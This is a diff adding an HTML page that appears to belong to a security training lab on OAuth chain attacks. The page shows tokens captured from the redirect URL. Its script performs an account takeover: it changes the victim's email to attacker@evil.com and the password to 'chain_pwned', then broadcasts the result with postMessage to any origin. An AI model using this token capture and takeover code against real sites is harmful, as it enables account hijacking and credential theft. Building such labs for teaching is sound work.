@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Chain Attack - Token Capture</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body style="background:#1a0a0a;min-height:100vh">
+  <div style="max-width:600px;margin:40px auto;padding:24px">
+    <div style="background:rgba(239,68,68,0.15);border:2px solid var(--danger);border-radius:12px;padding:24px;text-align:center">
+      <h2 style="color:var(--danger)">&#9760; Chain Attack - Token Captured</h2>
+      <p style="color:var(--text-secondary);margin-top:8px">OAuth redirect landed here via PostMessage + CSPT chain</p>
+    </div>
+
+    <div class="attacker-console" style="margin-top:16px;border-color:#8b0000">
+      <div class="title" style="color:#ff4444">Captured Credentials</div>
+      <div id="captured"></div>
+    </div>
+
+    <div style="margin-top:16px">
+      <button class="btn btn-danger" onclick="executeATO()" id="ato-btn" style="width:100%">Execute ATO (change email + password)</button>
+      <div id="ato-result" style="margin-top:8px;font-size:13px"></div>
+    </div>
+
+    <div style="margin-top:16px;text-align:center">
+      <a href="/labs/chains/level3.html" class="btn btn-secondary" style="text-decoration:none">Back to Chain Lab 3</a>
+      <a href="/labs/chains/level4.html" class="btn btn-secondary" style="text-decoration:none;margin-left:8px">Back to Chain Lab 4</a>
+    </div>
+  </div>
+
+  <script>
+    var cap = document.getElementById('captured');
+    var url = location.href;
+
+    cap.innerHTML = '<div class="log">URL: ' + url.substring(0, 120) + '</div>';
+
+    // Extract from query
+    var params = new URLSearchParams(location.search);
+    ['code', 'state', 'error', 'sso_token'].forEach(function(key) {
+      var val = params.get(key);
+      if (val) {
+        cap.innerHTML += '<div class="log" style="color:var(--danger)">' + key + ': ' + val + '</div>';
+      }
+    });
+
+    // Extract from fragment
+    if (location.hash) {
+      var hParams = new URLSearchParams(location.hash.substring(1));
+      ['access_token', 'id_token', 'token_type'].forEach(function(key) {
+        var val = hParams.get(key);
+        if (val) {
+          cap.innerHTML += '<div class="log" style="color:var(--danger)">' + key + ': ' + val + '</div>';
+        }
+      });
+    }
+
+    cap.innerHTML += '<div class="log" style="color:var(--success)">Session cookie also set during OAuth flow!</div>';
+
+    function executeATO() {
+      cap.innerHTML += '<div class="log" style="color:var(--danger)">Executing ATO...</div>';
+
+      fetch('/api/user/change-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        credentials: 'include',
+        body: JSON.stringify({ email: 'attacker@evil.com' })
+      })
+      .then(r => r.json())
+      .then(() => {
+        cap.innerHTML += '<div class="log" style="color:var(--danger)">Email changed to attacker@evil.com</div>';
+        return fetch('/api/user/change-password', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          credentials: 'include',
+          body: JSON.stringify({ newPassword: 'chain_pwned' })
+        });
+      })
+      .then(r => r.json())
+      .then(() => {
+        cap.innerHTML += '<div class="log" style="color:var(--danger)">Password changed!</div>';
+        cap.innerHTML += '<div class="log" style="color:var(--danger);font-size:14px">*** FULL ATO VIA CHAIN ATTACK ***</div>';
+        document.getElementById('ato-result').innerHTML =
+          '<span style="color:var(--danger);font-weight:bold">ATO complete! Email + password changed.</span>';
+
+        // Notify parent if in iframe/opener
+        if (window.opener) {
+          window.opener.postMessage({ type: 'chain_complete', email: 'attacker@evil.com' }, '*');
+        }
+        if (window.parent !== window) {
+          window.parent.postMessage({ type: 'chain_complete', email: 'attacker@evil.com' }, '*');
+        }
+      });
+    }
+  </script>
+</body>
+</html>
